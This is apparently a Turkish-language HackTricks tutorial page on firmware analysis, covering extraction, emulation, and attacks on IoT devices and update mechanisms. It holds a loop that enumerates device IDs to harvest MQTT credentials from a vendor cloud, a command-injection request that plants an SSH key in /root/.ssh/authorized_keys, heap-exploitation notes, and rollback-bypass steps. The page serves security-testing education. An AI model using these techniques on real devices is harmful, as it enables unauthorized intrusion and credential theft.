# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giriş**

### İlgili kaynaklar

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru çalışmasını sağlayan temel bir yazılımdır. Kalıcı bellekte saklanır; böylece cihaz, açıldığı andan itibaren işletim sisteminin başlatılmasına kadar gerekli talimatlara erişebilir. Güvenlik açıklarını belirlemede firmware'i incelemek ve olası değişiklikler yapmak kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamak için kritik bir ilk adımdır. Bu süreçte aşağıdakilerle ilgili veriler toplanır:

- CPU mimarisi ve üzerinde çalıştığı işletim sistemi
- Bootloader ayrıntıları
- Donanım yerleşimi ve veri sayfaları
- Kod tabanı ölçümleri ve kaynak kodun konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişi ve mevzuata uygunluk sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve belirlenen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları çok değerlidir. Ayrıca mevcut tüm open-source yazılım bileşenlerini manuel ve otomatik inceleme süreçleriyle analiz etmek de faydalıdır. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz olanağı sunar.

## **Firmware'i Edinme**

Firmware'i edinmenin çeşitli yolları vardır ve her birinin karmaşıklık düzeyi farklıdır:

- Kaynaktan (**geliştiricilerden veya üreticilerden**) doğrudan edinme
- Sağlanan talimatları izleyerek **derleme**
- Resmî destek sitelerinden **indirme**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularından yararlanma
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage** alanlarına doğrudan erişme
- Man-in-the-middle teknikleriyle **güncellemeleri** yakalama
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkarma**
- Cihaz iletişimindeki güncelleme isteklerini **sniff etme**
- **Hardcoded güncelleme uç noktalarını** belirleme ve kullanma
- Bootloader'dan veya ağ üzerinden **dump alma**
- Diğer tüm yöntemler başarısız olduğunda, uygun donanım araçlarını kullanarak depolama yongasını **çıkarma ve okuma**

### Yalnızca UART günlükleri: flash'taki U-Boot env üzerinden root shell'i zorlama

UART RX yok sayılıyorsa (yalnızca günlükler varsa), U-Boot environment blob'unu çevrimdışı **düzenleyerek** yine de bir init shell'i zorlayabilirsiniz:<sup>[[6]](#references)</sup>

1. SOIC-8 klipsi ve programlayıcı (3.3V) kullanarak SPI flash'ı dump edin:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env bölümünü bulun, `bootargs`'ı `init=/bin/sh` içerecek şekilde düzenleyin ve blob için **U-Boot env CRC32'yi yeniden hesaplayın**.
3. Yalnızca env bölümünü yeniden flash'layıp yeniden başlatın; UART'ta bir shell görünmelidir.

Bu yöntem, bootloader shell'inin devre dışı bırakıldığı ancak env bölümünün harici flash erişimiyle yazılabildiği gömülü cihazlarda kullanışlıdır.

## Firmware'i analiz etme

Artık **firmware'e sahipsiniz**; onu nasıl ele alacağınızı öğrenmek için firmware'den bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz farklı araçlar:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Bu araçlarla fazla bir şey bulamazsanız, `binwalk -E <bin>` ile imajın **entropy** değerini kontrol edin; entropy düşükse imajın şifrelenmiş olması pek olası değildir. Entropy yüksekse imaj muhtemelen şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca **firmware içine gömülü dosyaları** çıkarmak için şu araçları kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ya da dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kullanabilirsiniz.

### Dosya Sistemini Edinme

Önceki bölümde açıklanan `binwalk -ev <bin>` gibi araçlarla **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle dosya sistemini, adını dosya sistemi türünden alan bir **klasöre** çıkarır. Bu türler genellikle şunlardan biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Manuel Olarak Çıkarma

Bazen binwalk, dosya sisteminin magic byte değerini imzalarında bulundurmaz. Bu durumlarda binwalk kullanarak **dosya sisteminin offset değerini bulun**, sıkıştırılmış dosya sistemini ikili dosyadan **ayıklayın** ve aşağıdaki adımları izleyerek dosya sistemini türüne göre **manuel olarak çıkarın**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs dosya sistemini carve etmek için aşağıdaki **dd komutunu** çalıştırın.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash kullanılan ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware Analizi

Firmware elde edildikten sonra yapısını ve olası güvenlik açıklarını anlamak için firmware'i incelemek gerekir. Bu süreç, firmware imajındaki değerli verileri analiz edip çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

İkili dosyanın (`<bin>` olarak adlandırılır) ilk incelemesi için bir dizi komut sunulmuştur. Bu komutlar; dosya türlerini belirlemeye, dizeleri çıkarmaya, ikili verileri analiz etmeye ve bölüm ile dosya sistemi ayrıntılarını anlamaya yardımcı olur:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Görüntünün şifreleme durumunu değerlendirmek için `binwalk -E <bin>` ile **entropi** kontrol edilir. Düşük entropi, şifreleme olmadığını düşündürürken yüksek entropi olası şifreleme veya sıkıştırmaya işaret eder.

**Gömülü dosyaları** çıkarmak için **file-data-carving-recovery-tools** belgeleri ve dosya incelemesi için **binvis.io** gibi araç ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` kullanılarak dosya sistemi genellikle çıkarılabilir; çoğu zaman dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) çıkarılır. Ancak **binwalk**, magic byte'lar eksik olduğundan dosya sistemi türünü tanıyamadığında manuel çıkarma gerekir. Bunun için `binwalk` ile dosya sisteminin konumu bulunur, ardından dosya sistemini ayıklamak üzere `dd` komutu kullanılır:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daha sonra, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içeriği manuel olarak çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranmaya başlanır. Güvenli olmayan ağ daemon'ları, hardcoded kimlik bilgileri, API endpoint'leri, güncelleme sunucusu işlevleri, derlenmemiş kodlar, başlangıç betikleri ve çevrimdışı analiz için derlenmiş binary'ler incelenir.

İncelenmesi gereken **önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı kimlik bilgileri için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Olası güvenlik açıkları için yapılandırma ve betik dosyaları
- Daha ileri analiz için gömülü binary'ler
- Yaygın IoT cihazı web sunucuları ve binary'leri

Dosya sistemindeki hassas bilgileri ve güvenlik açıklarını ortaya çıkarmaya yardımcı olan çeşitli araçlar vardır:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analizi için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Statik ve dinamik analiz için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş Binary'lerde Güvenlik Kontrolleri

Dosya sisteminde bulunan hem kaynak kodu hem de derlenmiş binary'ler güvenlik açıklarına karşı incelenmelidir. Unix binary'leri için **checksec.sh**, Windows binary'leri için **PESecurity** gibi araçlar, istismar edilebilecek korumasız binary'leri belirlemeye yardımcı olur.

## Türetilmiş URL token'ları aracılığıyla cloud yapılandırmasını ve MQTT kimlik bilgilerini elde etme

Birçok IoT hub'ı, cihaza özel yapılandırmasını şu biçimdeki bir cloud endpoint'inden alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analizi sırasında, `<token>` değerinin cihaz kimliğinden hardcoded bir secret kullanılarak yerel olarak türetildiğini görebilirsiniz. Örneğin:

- token = MD5( deviceId || STATIC_KEY ) ve büyük harfli hex biçiminde gösterilir

Bu tasarım, deviceId ve STATIC_KEY değerlerini öğrenen herkesin URL'yi yeniden oluşturup cloud yapılandırmasını almasını sağlar; bu yapılandırmada sıklıkla düz metin MQTT kimlik bilgileri ve topic önekleri bulunur.

Uygulamalı iş akışı:

1) UART boot günlüklerinden deviceId değerini çıkarın

- 3.3V UART adaptörü (TX/RX/GND) bağlayın ve günlükleri yakalayın:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Cloud config URL kalıbını ve broker adresini yazdıran satırları arayın. Örneğin:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Firmware'den STATIC_KEY'i ve token algoritmasını kurtarın

- Binary dosyalarını Ghidra/radare2'ye yükleyin ve config path ("/pf/") ya da MD5 kullanımını arayın.
- Algoritmayı doğrulayın (örn. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe dönüştürün:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud config ve MQTT kimlik bilgilerini topla

- URL’yi oluşturup curl ile JSON’ı çek; sırları çıkarmak için jq ile ayrıştır:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Düz metin MQTT ve zayıf topic ACL'lerini kötüye kullanın (varsa)

- Bakım topic'lerine abone olmak ve hassas olayları aramak için kurtarılan kimlik bilgilerini kullanın:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Tahmin edilebilir cihaz ID'lerini listeleyin (ölçekli olarak, yetkilendirmeyle)

- Birçok ekosistem, satıcı OUI/ürün/tür baytlarının ardından sıralı bir son ek kullanır.
- Aday ID'leri yineleyebilir, token'lar türetebilir ve yapılandırmaları programatik olarak alabilirsiniz:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notlar
- Toplu enumeration denemeden önce her zaman açık yetki alın.
- Mümkün olduğunda hedef donanımı değiştirmeden sırları elde etmek için emülasyonu veya statik analizi tercih edin.


Firmware emülasyonu süreci, bir cihazın çalışmasının veya tek bir programın **dinamik analizini** mümkün kılar. Bu yaklaşım donanım veya mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak root dosya sistemini veya belirli ikili dosyaları, Raspberry Pi gibi mimarisi ve endianness'i eşleşen bir cihaza ya da önceden oluşturulmuş bir sanal makineye aktarmak daha ileri testleri kolaylaştırabilir.

### Tekil İkili Dosyaları Emüle Etme

Tek programları incelerken programın endianness'ini ve CPU mimarisini belirlemek çok önemlidir.

#### MIPS Mimarisi Örneği

MIPS mimarisindeki bir ikili dosyayı emüle etmek için şu komut kullanılabilir:

```bash
file ./squashfs-root/bin/busybox
```

Ve gerekli emülasyon araçlarını yüklemek için:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) için `qemu-mips`, little-endian binary'ler içinse `qemu-mipsel` kullanılır.

#### ARM Mimarisi Emülasyonu

ARM binary'leri için süreç benzerdir; emülasyonda `qemu-arm` emülatörü kullanılır.

### Tam Sistem Emülasyonu

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve diğer araçlar, tüm firmware'in emülasyonunu kolaylaştırır, süreci otomatikleştirir ve dinamik analize yardımcı olur.

## Uygulamada Dinamik Analiz

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. İşletim sistemine ve dosya sistemine shell erişimini korumak önemlidir. Emülasyon, donanım etkileşimlerini kusursuz biçimde taklit etmeyebilir; bu nedenle emülasyonu zaman zaman yeniden başlatmak gerekebilir. Analizde dosya sistemi yeniden incelenmeli, dışa açık web sayfaları ve ağ servisleri istismar edilmeli, bootloader güvenlik açıkları araştırılmalıdır. Potansiyel backdoor güvenlik açıklarını belirlemek için firmware bütünlük testleri kritik önemdedir.

## Runtime Analiz Teknikleri

Runtime analizi, bir süreç veya binary ile çalıştığı ortamda etkileşime girmeyi kapsar. Bunun için breakpoint ayarlama ve fuzzing gibi tekniklerle güvenlik açıklarını belirlemede gdb-multiarch, Frida ve Ghidra gibi araçlar kullanılır.

Tam bir debugger bulunmayan gömülü hedeflerde, cihaza **statik bağlantılı bir `gdbserver` kopyalayın** ve uzaktan bağlanın:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor mesaj eşlemesi

IoT hub'larda RF stack genellikle bir **radio MCU** ile Linux userland process'i arasında bölünür. Yararlı bir iş akışı, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. Havada **RF frame**
2. Radio MCU'daki **controller-side parser**
3. Linux'a aktarılan **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon'daki **application dispatcher**
5. **Protocol-specific handler / state machine**

Bu mimari, tek bir hedef yerine tersine mühendislik için iki hedef oluşturur. Controller, binary radio frame'lerini `Group,Command,arg1,arg2,...` gibi bir textual protocol'e dönüştürüyorsa şunları ortaya çıkarın:

- **Message group**'ları ve dispatch table'ları
- Hangi mesajların **network**'ten, hangilerinin controller'ın kendisinden gelebileceği
- Tam **manufacturer-specific discriminator field**'ları (örneğin Zigbee `manufacturer_code` ve özel `cluster_command`)
- Yalnızca **commissioning**, discovery veya firmware/model indirme aşamalarında erişilebilen handler'lar

Özellikle Zigbee için pairing trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerini kullanıp kullanmadığını kontrol edin. Kullanıyorsa, commissioning trafiğini dinlemek **Network Key**'i açığa çıkarabilir. Zigbee 3.0 install code'ları bu riski azaltır; bu nedenle test edilen cihazın bunları gerçekten zorunlu kılıp kılmadığını not edin.

### Manufacturer-specific protocol handler'ları ve FSM ile kısıtlanan erişilebilirlik

Vendor-specific Zigbee/ZCL command'ları, genellikle standart cluster'lardan daha iyi bir hedeftir; çünkü daha az kapsamlı test edilmiş **custom parsing code** ve dahili **FSM**'lere ulaşırlar.<sup>[[8]](#references)</sup>

Pratik iş akışı:

- **Vendor-only handler**'ı bulana kadar command dispatcher'ı tersine mühendislikle inceleyin.
- **FSM state**, **event**, **check**, **action** ve **next-state** table'larını ortaya çıkarın.
- Otomatik ilerleyen **transitional state**'leri ve sonunda saldırganın kontrolündeki state'i sıfırlayan veya serbest bırakan retry/error branch'lerini belirleyin.
- Hatalı handler'ın her zaman erişilebilir olduğunu varsaymak yerine, daemon'ı savunmasız duruma getirmek için hangi meşru protocol alışverişlerinin gerektiğini doğrulayın.

Zamanlamaya duyarlı protocol'lerde, Python framework'ünden packet replay yapmak fazla yavaş olabilir. Daha güvenilir bir yaklaşım, doğru **endpoint**'leri, **attribute**'ları ve commissioning zamanlamasını sunabilmek için vendor-grade stack kullanan gerçek donanım (örneğin bir **nRF52840**) üzerinde meşru bir cihazı emüle etmektir.

### Embedded daemon'larda fragmented-download bug sınıfı

Yinelenen bir firmware bug sınıfı, **fragmented blob/model/configuration download** işlemlerinde görülür:<sup>[[8]](#references)</sup>

1. **First fragment** (`offset == 0`), `ctx->total_size` değerini kaydeder ve `malloc(total_size)` ile bellek ayırır.
2. Sonraki fragment'ler yalnızca `packet_total_size >= offset + chunk_len` gibi saldırganın kontrolündeki **packet-local** field'ları doğrular.
3. Kopyalama işlemi, **ilk ayrılan boyutu** kontrol etmeden `memcpy(&ctx->buffer[offset], chunk, chunk_len)` kullanır.

Bu, saldırganın şunları göndermesine olanak tanır:

- Küçük bir heap allocation yapılmasını sağlamak için **küçük** bir bildirilmiş total size içeren geçerli bir first fragment.
- **Beklenen offset** değerine, ancak daha büyük bir `chunk_len` değerine sahip sonraki bir fragment.
- İlk ayrılan buffer'ı taşırırken yeni kontrolleri karşılayan sahte bir packet-local size.

Savunmasız yol commissioning mantığının arkasındaysa, exploitation için bozuk fragment'leri göndermeden önce hedefi beklenen model-download veya blob-download durumuna getirecek yeterli **device emulation** gerekir.

### Protocol kaynaklı `free()` tetikleyicileri

Embedded daemon'larda heap metadata exploitation'ı tetiklemenin en kolay yolu çoğu zaman "cleanup işlemini beklemek" değil, **protocol'ün kendi error handling'ini zorlamaktır**:<sup>[[8]](#references)</sup>

- FSM'i **retry** veya **error** state'lerine geçirmek için bozuk devam fragment'leri gönderin.
- Daemon'ın **context'i sıfırlayıp** bozulmuş buffer'ı serbest bırakmasına yetecek kadar retry eşiğini aşın.
- Process ilgisiz nedenlerle çökmeden önce allocator-side primitive'leri tetiklemek için bu öngörülebilir `free()` işleminden yararlanın.

Bu yaklaşım, özellikle embedded Linux'taki **musl/uClibc/dlmalloc-like** allocator'larda kullanışlıdır; burada chunk metadata'sını bozmak, unlink/unbin mantığını bir write primitive'e dönüştürebilir. Kararlı bir yöntem, gerçek bin pointer'larını hemen bozup process'i çökertmek yerine allocator traversal'ını **overflowed buffer** içinde hazırlanmış **fake chunk**'lara yönlendirmek için bir **size field**'ını bozmaktır.

## Binary Exploitation ve Proof-of-Concept

Belirlenen vulnerabilities için PoC geliştirmek, hedef mimarinin derinlemesine anlaşılmasını ve düşük seviyeli dillerde programlama yapmayı gerektirir. Embedded sistemlerde binary runtime protection'lar nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekebilir.

### uClibc fastbin exploitation notları (embedded Linux)

- **Fastbin'ler + birleştirme:** uClibc, glibc'ye benzer fastbin'ler kullanır. Daha sonraki büyük bir allocation `__malloc_consolidate()` işlevini tetikleyebilir; bu nedenle fake chunk, kontrolleri geçmelidir (makul size, `fd = 0` ve çevresindeki chunk'ların "in use" olarak görülmesi).<sup>[[6]](#references)</sup>
- **ASLR altında non-PIE binary'ler:** ASLR etkin olsa bile ana binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri sabittir. Fastbin allocation'ı bir **function pointer table** üzerine yönlendirmek için zaten geçerli bir heap chunk header'ına benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser'ı durduran NUL:** JSON parse edilirken payload'daki bir `\x00`, trailing attacker-controlled byte'ları stack pivot/ROP chain için kullanılabilir halde bırakıp parsing'i durdurabilir.
- **`/proc/self/mem` üzerinden shellcode:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, yürütülebilir shellcode'u bilinen bir mapping'e yerleştirip oraya atlayabilir.

## Firmware Analysis için Hazır İşletim Sistemleri

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, firmware security testing için gerekli araçlarla donatılmış, önceden yapılandırılmış ortamlar sağlar.

## Firmware Analizi için Hazır OS'ler

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarında security assessment ve penetration testing yapmanıza yardımcı olmak için tasarlanmış bir distro'dur. Gerekli tüm araçların yüklü olduğu, önceden yapılandırılmış bir ortam sunarak zamandan tasarruf etmenizi sağlar.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing işletim sistemi.

## Firmware Downgrade Attacks ve Güvensiz Update Mekanizmaları

Bir vendor, firmware image'ları için cryptographic signature check'leri uygulasa bile **version rollback (downgrade) protection** çoğunlukla atlanır. Boot- veya recovery-loader, yalnızca gömülü bir public key ile signature'ı doğruluyor, ancak flash edilecek image'ın *version*'ını (veya monotonic counter'ını) karşılaştırmıyorsa saldırgan, geçerli bir signature taşıyan **daha eski, savunmasız bir firmware'i** meşru şekilde yükleyebilir ve böylece yamalanmış vulnerabilities'ı yeniden ortaya çıkarabilir.<sup>[[4]](#references)</sup>

Tipik saldırı iş akışı:

1. **Daha eski, imzalı bir image edinin**
   * Vendor'ın herkese açık download portal'ından, CDN'inden veya support site'ından alın.
   * Companion mobile/desktop application'lardan çıkarın (ör. bir Android APK içindeki `assets/firmware/` dizininden).
   * VirusTotal, Internet archives, forumlar vb. üçüncü taraf repository'lerden edinin.
2. Image'ı açık olan herhangi bir update channel üzerinden cihaza **yükleyin veya sunun**:
   * Web UI, mobile-app API, USB, TFTP, MQTT vb.
   * Birçok consumer IoT cihazı, Base64-encoded firmware blob'larını kabul eden, bunları sunucu tarafında decode edip recovery/upgrade işlemini başlatan *unauthenticated* HTTP(S) endpoint'leri sunar.
3. Downgrade sonrasında, daha yeni sürümde yamalanmış bir vulnerability'yi exploit edin (örneğin sonradan eklenmiş bir command-injection filter).
4. İsteğe bağlı olarak, persistence elde ettikten sonra tespit edilmemek için en güncel image'ı yeniden flash edin veya update'leri devre dışı bırakın.

### Örnek: Downgrade Sonrası Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Güvenlik açığı bulunan (düşürülmüş) firmware'de, `md5` parametresi herhangi bir temizleme işleminden geçirilmeden doğrudan bir shell komutuna eklenir ve böylece rastgele komutların enjekte edilmesine olanak tanır (burada SSH anahtarıyla root erişimi sağlamak için). Sonraki firmware sürümlerinde temel bir karakter filtresi eklendi, ancak downgrade korumasının olmaması düzeltmeyi etkisiz kılıyor.<sup>[[4]](#references)</sup>

### Mobil Uygulamalardan Firmware Çıkarma

Birçok satıcı, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için tam firmware imajlarını yardımcı mobil uygulamalarına ekler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollar altında şifrelenmeden saklanır. `apktool`, `ghidra` gibi araçlar, hatta düz `unzip`, fiziksel donanıma dokunmadan imzalı imajları çıkarmanızı sağlar.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot tasarımlarında yalnızca updater'da bulunan anti-rollback korumasını atlatma

Bazı satıcılar anti-downgrade **ratchet** uygular, ancak bunu yalnızca *updater* mantığında yapar (örneğin CAN üzerinden bir UDS rutini, bir recovery komutu veya bir userspace OTA agent). **Bootloader** daha sonra yalnızca image signature/CRC kontrolü yapıyor ve partition table'a ya da slot metadata'sına güveniyorsa rollback koruması yine de atlatılabilir.<sup>[[7]](#references)</sup>

Yaygın zayıf tasarım:

- Firmware metadata'sı hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini persistent storage'da tutulan bir değerle karşılaştırır ve daha eski, imzalı image'ları reddeder.
- Bootloader bu ratchet değerini **parse etmez**; seçili slotu boot etmeden önce yalnızca header, CRC ve signature değerlerini doğrular.
- Slot aktivasyonu ayrı bir partition table'da veya slot başına tutulan generation counter'da saklanır ve doğrulanan tam firmware digest değerine **kriptografik olarak bağlanmaz**.

Bu durum, dual-slot sistemlerde **bir image'ı doğrula / başka bir image'ı boot et** primitive'ini oluşturur. Saldırgan updater'a güncel, imzalı bir image kullanarak slot B'yi bir sonraki boot hedefi olarak işaretletebilir ve reboot öncesinde slot B'nin üzerine yazabilirse, bootloader yalnızca önceden kaydedilmiş slot metadata'sına güvendiğinden eski image'ı yine de boot edebilir.

Yaygın kötüye kullanım örüntüsü:

1. **Güncel, imzalı** bir firmware'i pasif slota yükleyin ve normal doğrulama/değiştirme rutinini çalıştırarak düzenin bu slotu bir sonraki etkin slot olarak işaretlemesini sağlayın.
2. **Henüz reboot etmeyin**. Aynı session içinde slot hazırlama/silme rutinine yeniden girin.
3. Updater'ın az önce etkinleştirilen **aynı fiziksel slotu** silmesi için stale boot-state veya stale slot-selection mantığını kötüye kullanın.
4. Bu slota **daha eski ama hâlâ imzalı** bir firmware yazın.
5. Ratchet'i uygulayan doğrulama rutinini atlayın ve doğrudan reboot edin.
6. Bootloader etkinleştirilen slotu seçer, yalnızca signature/integrity değerlerini doğrular ve eski image'ı boot eder.

A/B update uygulamalarını reverse ederken dikkat edilecek noktalar:

- Slot seçiminin, başarılı bir geçişten sonra yenilenmeyen **boot-time flag** değerlerinden türetilmesi.
- **Geçerli commit edilmiş düzen** yerine stale state'e göre slot silen, `prepare_passive_slot()` benzeri bir rutin.
- Doğrulanmış image hash'ini kaydetmeden yalnızca **generation counter** / active flag değerini artıran, `part_write_layout()` benzeri bir işlev.
- Ratchet kontrollerinin userspace veya updater kodunda uygulanması, ancak ROM / bootloader / secure boot aşamalarında **uygulanmaması**.
- İçeriği silinip yeniden yazıldıktan sonra bile slotu boot edilebilir durumda bırakan silme veya recovery rutinleri.

### Update Logic'i Değerlendirme Kontrol Listesi

* *Update endpoint*'in aktarımı/kimlik doğrulaması yeterince korunuyor mu (TLS + authentication)?
* Cihaza flashing yapmadan önce **version number** değerlerini veya **monotonic anti-rollback counter** değerini karşılaştırıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. signature değerleri ROM kodu tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca signature/CRC kontrol etmek yerine updater ile aynı ratchet'i uygulıyor mu?
* Slot aktivasyon metadata'sı **doğrulanmış firmware digest/version değerine bağlı mı**, yoksa etkinleştirme sonrasında slot değiştirilebilir mi?
* Slot değiştirme başarılı olduktan sonra cihazın reboot etmesi zorunlu mu, yoksa aynı session içinde sonraki update/silme rutinlerine hâlâ erişilebiliyor mu?
* Userland kodu ek sanity check'ler yapıyor mu (ör. izin verilen partition map, model number)?
* *Partial* veya *backup* update akışları aynı doğrulama mantığını yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback saldırılarına karşı savunmasızdır.

## Pratik yapmak için savunmasız firmware'ler

